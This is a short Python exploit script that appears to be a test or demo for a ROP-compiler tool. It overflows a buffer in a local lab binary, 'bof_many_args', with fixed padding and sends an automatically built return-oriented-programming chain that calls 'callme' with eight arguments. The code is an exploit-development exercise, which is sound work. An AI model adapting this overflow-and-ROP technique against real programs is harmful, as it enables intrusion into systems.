import sys, logging
from pwn import *
from rop_compiler import ropme, goal

is_64bit = not (len(sys.argv) > 1 and sys.argv[1].lower() == "x86")

if is_64bit:
  filename = './bof_many_args'
else:
  filename = './bof_many_args_x86'

files = [(filename, None, None)]
rop = ropme.rop(files, [], [["function", "callme", 11,12,13,14,15,16,17,18]], log_level = logging.DEBUG)

if is_64bit:
  payload = 'A'*512 + 'B'*8 + rop
else:
  payload = 'A'*524 + 'B'*4 + rop

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

p = process([filename,'3000'])

if "debug" in sys.argv:
  if is_64bit:
    gdb.attach(p, "set disassembly-flavor intel\nbreak *0x400731\nbreak callme\n") # 64-bit
  else:
    gdb.attach(p, "set disassembly-flavor intel\nbreak *0x080485ec\nbreak callme\n") # 32-bit

p.writeline(payload)
print "\n%s\n" % p.readline()
